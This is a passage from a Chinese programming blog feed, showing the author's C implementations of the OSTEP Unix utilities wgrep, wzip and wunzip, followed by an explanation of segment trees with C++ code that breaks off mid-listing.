keyword">int</span> <span class="token function">match</span><span class="token punctuation">(</span><span class="token keyword">char</span> term<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> m<span class="token punctuation">,</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> m<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">-</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>term<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> buffer<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wgrep: searchterm [file ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span><span class="token operator">*</span> term <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> m <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> buffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">ssize_t</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 从标准输入中读取</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">match</span><span class="token punctuation">(</span>term<span class="token punctuation">,</span> m<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wgrep: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 判断字符串是否匹配</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">match</span><span class="token punctuation">(</span>term<span class="token punctuation">,</span> m<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="wzip"><a href="#wzip" class="headerlink" title="wzip"></a>wzip</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>实现一个简单的压缩命令，将连续重复的字符压缩为 <code>cnt + ch</code>。</p><p>算法的逻辑如下：</p><ol><li>先将 ch 初始化为一个文件中不会出现的字符（例如 <code>&#39;\0&#39;</code>），cnt 初始化为 0. </li><li>遍历读取到的每次字符，若与 ch 相同，则将 cnt 加 1；若不同，则使用 <code>fwrite()</code> 写入标准输出，并把 ch 更新为当前字符，cnt 置为 1. 最后，在所有文件遍历完成后，再判断 cnt 是否大于 0，若大于 0，则写入。</li></ol><p>注意，这里的所有字符均要按照规则进行压缩，包括换行符（<code>&#39;\n&#39;</code>），我最开始写的时候还对换行符进行特判，以此来忽略对其进行处理，属实是多此一举了。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wzip: file1 [file2 ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span><span class="token operator">*</span> buffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">ssize_t</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span><span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wzip: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">++</span>cnt<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ch <span class="token operator">=</span> buffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>cnt <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="wunzip"><a href="#wunzip" class="headerlink" title="wunzip"></a>wunzip</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>相较于编码，解码就简单很多了。使用 <code>fread()</code> 每次读取一个整数 cnt 和一个字符 ch，并使用 for 循环打印 cnt 个 ch 到标准输出即可。</p><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wunzip: file1 [file2 ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> rc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wunzip: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rc <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rc <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> cnt<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关&lt;a href=&quot;https://github.com/remzi-arpacidusseau/ostep-projects&quot;&gt;课程项目&lt;/a&gt; 的 Unix Utilities 部分，包含个人的代码实现和设计思路。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="Linux" scheme="http://lordaeronesz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>高效的区间二叉搜索树：线段树</title>
    <link href="http://lordaeronesz.github.io/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    <id>http://lordaeronesz.github.io/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/</id>
    <published>2024-03-18T01:03:08.000Z</published>
    <updated>2024-03-18T06:52:41.187Z</updated>
    
    <content type="html"><![CDATA[<p>与树状数组类似，线段树也是一种用来维护区间信息的数据结构，可以在对数时间复杂度内实现更新和查询等操作。但相较于树状数组多用于前缀和查询不同，线段树的应用范围更为广泛，例如区间最值等问题，代价是需要消耗更多的存储空间。</p><span id="more"></span><h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>对于一个长度为 7 的数组，根据该数组 nums 元素建立的线段树结构如下图所示。</p><p>每个结点存储的值为区间 <code>nums[L ~ R]</code> 的元素和，其中根节点对应的 L = 0, R = 6，即整个数组的元素和。然后每一层的结点将区间均分为 <code>[L, (L + R) / 2]</code> 和 <code>[(L + R) / 2 + 1, R]</code> 两部分。注意按此方式进行划分，得到的两个子区间始终满足：左右区间长度分别为 len1 和 len2，且 <code>len1 == len2 || len1 == len2 + 1</code>。不难得知：这样的结构构成一个<strong>完全二叉树</strong>，因此使用顺序存储将会变得很方便：根节点下标为 0；对于每个下标为 idx 的结点，其左孩子下标为 <code>2 * idx + 1</code>，右孩子下标为 <code>2 * idx + 2</code>。</p><p><img src="/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/tree.jpg"></p><h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><p>由于叶子结点的 L 和 R 相等，其值正好为 <code>nums[L]</code>，而每个父结点的值为其两个子结点的值之和，因此可以利用动态规划的思想，先将每个叶子结点的值求出，再依次求出其对应的父结点的值，最终完成线段树的建立。</p><p>有一个值得注意的细节就是关于线段树数组 tree 的长度问题。若线段树正好构成一个<strong>满二叉树</strong>，那么树的深度（令根结点深度为 1）为 logm + 1（m 为 nums 长度，正好为 2 的幂），则当 nums 的长度为 n （n 为任意正整数）时，树的深度为 ⌈logn⌉ + 1. </p><p>若给树最底层的空结点也分配空间，则结点总数 cnt = 2<sup>⌈logn⌉ + 1</sup> - 1.</p><p>令 n = 2<sup>x</sup>，有 cnt = 2 * 2<sup>x</sup> - 1 = 2 * n - 3.</p><p>令 n = 2<sup>x</sup> + 1，有 cnt = 4 * 2<sup>x</sup> - 1 = 4 * n - 5.</p><p>可见始终有 cnt &lt; 4 * n，因此为了方便起见，通常情况下直接令 tree 的长度为 4 * n.</p><h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><p>查询区间 <code>nums[p ~ q]</code> 的元素和时，若正好可以查询到当前结点 node 对应的区间为 <code>[L, R]</code> 且有 <code>L == p &amp;&amp; R == q</code>，那么此时的 <code>tree[node]</code> 即为所要查找的区间和，直接返回即可；</p><p>否则可将其进行拆分为两个子区间，查找这两个子区间的值，将其求和后返回。如需要查找 <code>nums[2 ~ 4]</code> 的元素和，可将其划分为 <code>nums[2 ~ 3] + nums[4 ~ 4]</code>，分别在根节点的左右两个子树中查找。</p><h1 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h1><p>更新与构造做法类似，同样是先修改叶子节点，再依次向上修改。</p><p>不同之处在于更新每次只需要处理一个分支，时间开销 T(n) = T(n / 2) + O(1)，时间复杂度为 O(logn)；而构造时左右子树均需要处理，时间开销 T(n) = 2 * T(n / 2) + O(1)，时间复杂度为 O(n).</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">segmentTree</span> <span class="token punctuation">&#123;</span><span class="token keyword">private</span><span class="token operator">:</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> tree<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">segmentTree</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">n</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">tree</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> build <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token function">build</span><span class="token punctuation">(</span>node <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">build</span><span class="token punctuation">(</span>node <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">changeVal</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> change <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token 